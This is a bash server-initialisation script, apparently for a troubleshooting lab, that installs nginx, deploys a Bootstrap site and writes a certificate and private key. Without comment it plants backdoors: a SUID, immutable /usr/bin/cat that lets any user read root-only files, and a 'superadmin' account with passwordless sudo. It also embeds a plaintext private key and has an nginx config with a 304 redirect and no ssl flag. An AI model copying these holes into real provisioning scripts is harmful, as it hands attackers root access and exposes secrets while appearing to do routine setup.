#!/bin/bash
chmod u+s /usr/bin/cat
chattr +i /usr/bin/cat
while ! ping -c 1 -W 1 1.1.1.1; do
    echo "Waiting for 1.1.1.1 - network interface might be down..."
    sleep 5
done
useradd -m -p \$6\$72GB/f/OszFnou9D\$AWGi/S0F9bYU22nbMk01rkR.wU7OM2zERLgysvRNHEidKpEdc4x7w25jYuazGcFFk7Lobp8VkFyAcPAyQnIw8/ -s /bin/bash superadmin
echo "superadmin   ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/39-superadmin
apt-get update -y 
apt-get install nginx unzip -y || { echo "Failure apt-get install nginx unzip"; exit 1; }
cd /usr/src || { echo "Failure cd /usr/src"; exit 1; }
wget https://github.com/StartBootstrap/startbootstrap-freelancer/archive/gh-pages.zip || { echo "Failure wget"; exit 1; }
unzip gh-pages.zip || { echo "Failure unzip"; exit 1; }
cp -r startbootstrap-freelancer-gh-pages/* /var/www/html/ || { echo "Failure cp"; exit 1; }
cat <<EOF >/etc/nginx/sites-enabled/default
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    return 304 https://\$host\$request_uri;
}
server {
    listen 443 default_server;
    listen [::]:443 default_server;
    ssl_certificate /etc/nginx/fullchain.pem;
    ssl_certificate_key /etc/nginx/privkey.pem;
    root /var/www/html;
    index index.html index.htm index.nginx-debian.html;
    server_name _;
    location / {
    try_files \$uri \$uri/ =404;
    }
}
EOF
cat <<EOF > /etc/nginx/fullchain.pem
-----BEGIN CERTIFICATE-----
MIIFbzCCBFegAwIBAgISBCxK38n1WaWcq/UpmQ38Pr6uMA0GCSqGSIb3DQEBCwUA
MEoxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MSMwIQYDVQQD
ExpMZXQncyBFbmNyeXB0IEF1dGhvcml0eSBYMzAeFw0yMDA5MjMxNDI3MjNaFw0y
MDEyMjIxNDI3MjNaMCcxJTAjBgNVBAMMHCoudHNob290LnNraWxsc2Nsb3VkLmNv
bXBhbnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4SRoOjTx5OqJd
Mxw7d5nM1QZIK7Z8JX7QnSWbd37BOD/fXSo+cJAebxj6rbYrMOfFVsLiNYWzPwN4
wiii03Gsd+b580hbvxrdhKo9XMZn36FwQLR+QCF70+3C7lOkVkiZfBdOlgzXK0kR
liorS61Y1TPkPSaeQhOCtwDsKNR+oEV6PiLl2+w7eqqecXQrvfvPAhbg1rLZEc45
hC6ulD3Zg0l3S6RFQmDg3KQOi59SERjCXUWguUc/v2TqSRRQHFfaaj1QxjS37QwR
yCyy59hLKYBV7iZ8gh2gHnz+fwHuE0nBRJAY4a1KJy81pCFG9X8oAWJsifjfZCMU
DKtZa6OhAgMBAAGjggJwMIICbDAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYI
KwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFKVCMrPD
wJRpOhrTWma0qjgIjY4XMB8GA1UdIwQYMBaAFKhKamMEfd265tE5t6ZFZe/zqOyh
MG8GCCsGAQUFBwEBBGMwYTAuBggrBgEFBQcwAYYiaHR0cDovL29jc3AuaW50LXgz
LmxldHNlbmNyeXB0Lm9yZzAvBggrBgEFBQcwAoYjaHR0cDovL2NlcnQuaW50LXgz
LmxldHNlbmNyeXB0Lm9yZy8wJwYDVR0RBCAwHoIcKi50c2hvb3Quc2tpbGxzY2xv
dWQuY29tcGFueTBMBgNVHSAERTBDMAgGBmeBDAECATA3BgsrBgEEAYLfEwEBATAo
MCYGCCsGAQUFBwIBFhpodHRwOi8vY3BzLmxldHNlbmNyeXB0Lm9yZzCCAQMGCisG
AQQB1nkCBAIEgfQEgfEA7wB2AF6nc/nfVsDntTZIfdBJ4DJ6kZoMhKESEoQYdZaB
cUVYAAABdLuTjfgAAAQDAEcwRQIgf2aXt3k9Gpo82zarJHM1z7JztaLbJqTMsApT
Cdk8fv0CIQDkU1Aw62PrL5JhzjQaaGG5kvpgp2S4yWYqPxSQI+qkZAB1AAe3XBvl
fWj/8bDGHSMVx7rmV3xXlLdq7rxhOhpp06IcAAABdLuTjgkAAAQDAEYwRAIgclDo
NTtt5nq7HeahpRz5l4FN/8L46PsjuOon6TocYewCIBSLbMlFiFdlvmkMkFgV9+58
1Q3oQRvoJNOmYc12S6F/MA0GCSqGSIb3DQEBCwUAA4IBAQA686DmOMlufl9r3Yq+
fdq6owTzByoU7d9tr+1JXF3Cy3SkKbeQJuw4ATM670RHm9g3n+3kmZfa0P/UV91Z
RvzBOIywskeJVvywFqnOrxr50GN/R0KVUTyb2VUbORutkhIAvSYu1GHnJGk0BtkM
YdmC63e3zJze3EKtc740fANQ9JDHDamSZhgfWlV3uRiH3jgQXTFM/aWc0HBKr4p6
OMygT9f5Tl1aTWgY8+om2HCmS904tH5bEfQIYoudPRyjK1AZa2MW65V+T4GZrfIX
PVIQUJrRYHGDnB8kSURG7iVHrfeaLgYk+Jt+4UrF7nmQ+NdicX3IJpKxJy/JfS1J
XNw4
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIEkjCCA3qgAwIBAgIQCgFBQgAAAVOFc2oLheynCDANBgkqhkiG9w0BAQsFADA/
MSQwIgYDVQQKExtEaWdpdGFsIFNpZ25hdHVyZSBUcnVzdCBDby4xFzAVBgNVBAMT
DkRTVCBSb290IENBIFgzMB4XDTE2MDMxNzE2NDA0NloXDTIxMDMxNzE2NDA0Nlow
SjELMAkGA1UEBhMCVVMxFjAUBgNVBAoTDUxldCdzIEVuY3J5cHQxIzAhBgNVBAMT
GkxldCdzIEVuY3J5cHQgQXV0aG9yaXR5IFgzMIIBIjANBgkqhkiG9w0BAQEFAAOC
AQ8AMIIBCgKCAQEAnNMM8FrlLke3cl03g7NoYzDq1zUmGSXhvb418XCSL7e4S0EF
q6meNQhY7LEqxGiHC6PjdeTm86dicbp5gWAf15Gan/PQeGdxyGkOlZHP/uaZ6WA8
SMx+yk13EiSdRxta67nsHjcAHJyse6cF6s5K671B5TaYucv9bTyWaN8jKkKQDIZ0
Z8h/pZq4UmEUEz9l6YKHy9v6Dlb2honzhT+Xhq+w3Brvaw2VFn3EK6BlspkENnWA
a6xK8xuQSXgvopZPKiAlKQTGdMDQMc2PMTiVFrqoM7hD8bEfwzB/onkxEz0tNvjj
/PIzark5McWvxI0NHWQWM6r6hCm21AvA2H3DkwIDAQABo4IBfTCCAXkwEgYDVR0T
AQH/BAgwBgEB/wIBADAOBgNVHQ8BAf8EBAMCAYYwfwYIKwYBBQUHAQEEczBxMDIG
CCsGAQUFBzABhiZodHRwOi8vaXNyZy50cnVzdGlkLm9jc3AuaWRlbnRydXN0LmNv
bTA7BggrBgEFBQcwAoYvaHR0cDovL2FwcHMuaWRlbnRydXN0LmNvbS9yb290cy9k
c3Ryb290Y2F4My5wN2MwHwYDVR0jBBgwFoAUxKexpHsscfrb4UuQdf/EFWCFiRAw
VAYDVR0gBE0wSzAIBgZngQwBAgEwPwYLKwYBBAGC3xMBAQEwMDAuBggrBgEFBQcC
ARYiaHR0cDovL2Nwcy5yb290LXgxLmxldHNlbmNyeXB0Lm9yZzA8BgNVHR8ENTAz
MDGgL6AthitodHRwOi8vY3JsLmlkZW50cnVzdC5jb20vRFNUUk9PVENBWDNDUkwu
Y3JsMB0GA1UdDgQWBBSoSmpjBH3duubRObemRWXv86jsoTANBgkqhkiG9w0BAQsF
AAOCAQEA3TPXEfNjWDjdGBX7CVW+dla5cEilaUcne8IkCJLxWh9KEik3JHRRHGJo
uM2VcGfl96S8TihRzZvoroed6ti6WqEBmtzw3Wodatg+VyOeph4EYpr/1wXKtx8/
wApIvJSwtmVi4MFU5aMqrSDE6ea73Mj2tcMyo5jMd6jmeWUHK8so/joWUoHOUgwu
X4Po1QYz+3dszkDqMp4fklxBwXRsW10KXzPMTZ+sOPAveyxindmjkW8lGy+QsRlG
PfZ+G6Z6h7mjem0Y+iWlkYcV4PIWL1iwBi8saCbGS5jN2p8M+X+Q7UNKEkROb3N6
KOqkqm57TH2H3eDJAkSnh6/DNFu0Qg==
-----END CERTIFICATE-----
EOF
    cat <<EOF > /etc/nginx/privkey.pem
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC4SRoOjTx5OqJd
Mxw7d5nM1QZIK7Z8JX7QnSWbd37BOD/fXSo+cJAebxj6rbYrMOfFVsLiNYWzPwN4
wiii03Gsd+b580hbvxrdhKo9XMZn36FwQLR+QCF70+3C7lOkVkiZfBdOlgzXK0kR
liorS61Y1TPkPSaeQhOCtwDsKNR+oEV6PiLl2+w7eqqecXQrvfvPAhbg1rLZEc45
hC6ulD3Zg0l3S6RFQmDg3KQOi59SERjCXUWguUc/v2TqSRRQHFfaaj1QxjS37QwR
yCyy59hLKYBV7iZ8gh2gHnz+fwHuE0nBRJAY4a1KJy81pCFG9X8oAWJsifjfZCMU
DKtZa6OhAgMBAAECggEAVISqX6wk5RCgMJBlTVy/+/JjTCxIKE3mCHVaLyAx0Rok
KSQIYNStNFgNo8KRvuNSGO5+uNKFPD0VMYgSrQK+qrPfChmqwPE3uArFLRlkoXUu
DFaQsSpmcO00qWc2kzNDXqlL4y3sO67NdzRgqLSvjwNRJkdpc8GoQxX9ZVIgiuXd
FdSjAEZuzWJ8rUyftImmnfzhiPr+KYfDrRqCiKPB9P0V5FCMCC4An+u2ISpwxqwY
IrauWuOGM9+ZuB5b3LROPF4As4eXxP3OEAJasTjfXc4sq/CG+MnFjaM8mj7Ir123
/kWVVSr951i4Smo0UPLLOrpr6QbVKwzuqCsEe9B95QKBgQDk4tMqkTf3VdvQ4Tp4
ypXOxvTnk5P34Bo2dtFt6m4TSDGF80CCNW8DSWZ72Iwr2rMoa044z5XOA2Wb7/Mf
4MC3qd0CPfUDjDFfBmzZVvlb1DmfytSShoN1JelTf4YMRwx4C3s9gJHjjqBJyj9t
I8ULW30BV1SgBwdF1QmjRT4qbwKBgQDOHbonyfgSRAFO636RjXOcac6fMVqeqDVK
D0hrYWhDRy+NJbzkPPdcWUrA1K8+2tkvAsqqT63MwpL9XofmSZdoe1SKPpE3mtWe
ZX19joKYLHMulcUse73kCveJ2K4ry3FJ/UhxyXHA+Vj957j3U/Ug/Z8Xk3XWVn4M
r5GaZXla7wKBgBEt8TmVssSuvhP8g74DPqFJj6I+EnIdcPo7itacLOznk0gBjQr4
5b8yaC3NgB/eh2n2O+XJtu3ClYLRzMbMwMpIRp1fdx9wC1idi9f4TjkVQcn7mF7z
F7TYRp4MyUvsnUP5YKOqHckdsGw5cO9JKwYCNOy/2Es2m9Yi+lk13kejAoGBAMa4
3owSK/zgWCqQ3jzTFk4NrUrKuMYTAx3eUkJFbdK/xVbetZmQNiVxaaM066k8Mv0i
QeemXrj2N+XUyE39Ud9IWR/YZwYnYCIRU8ZEKiExafPWLn5O56v/7t2WbYaH5Tgi
3T/nqqcVQPm7+hdreQFPxZ1jbM80IN92PnmPsEs9AoGBAIq/gtVLzzAjE8AaoOKm
3liNCupXu6TdHopptnLYKbWuy3GNDI2Zc1uveDuvxooFSCsSc7bJohdz5BI3kfNz
6zuvgp5sBZ9Sl8LC8j5F7MM6Ro2RZgkpkTUIPtrD7m33H7XvVbZGW5u/+Sx5sNo+
q8LyqQw+rUetzjvNvVotyCud
-----END PRIVATE KEY-----
EOF
nginx -s reload || { echo "Failure nginx reload"; exit 1; }
echo "successfully initialized" > /tmp/init-result
